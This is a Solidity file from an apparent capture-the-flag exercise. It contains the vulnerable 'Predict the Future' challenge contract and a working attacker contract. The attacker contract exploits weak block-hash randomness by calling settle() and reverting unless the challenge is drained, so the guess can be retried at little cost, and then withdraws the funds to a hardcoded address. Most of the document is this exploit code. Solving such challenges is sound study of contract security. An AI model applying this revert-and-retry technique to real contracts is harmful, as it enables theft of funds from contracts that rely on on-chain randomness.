pragma solidity ^0.4.21;

/**
    As the EVM is transactional, it is possible to execute operations and then check if the expected result is produced
    require(challengeContract.isComplete()); with this, we ensure that we can try without pay more than once
 */
contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Predictor {
    uint8 public answer;
    address myAddress = 0xEc948CC31227f0359717c69489cEe7BE7aEFbFD1;

    function callLockInGuess(address _challengeContract) external payable {
        PredictTheFutureChallenge challengeContract = PredictTheFutureChallenge(
            _challengeContract
        );
        challengeContract.lockInGuess.value(msg.value)(1);
    }

    function makeTheGuess(address _challengeContract) external {
        PredictTheFutureChallenge challengeContract = PredictTheFutureChallenge(
            _challengeContract
        );
        challengeContract.settle();
        require(challengeContract.isComplete());
    }

    function withdraw() external {
        myAddress.transfer(address(this).balance);
    }

    function() external payable {}
}
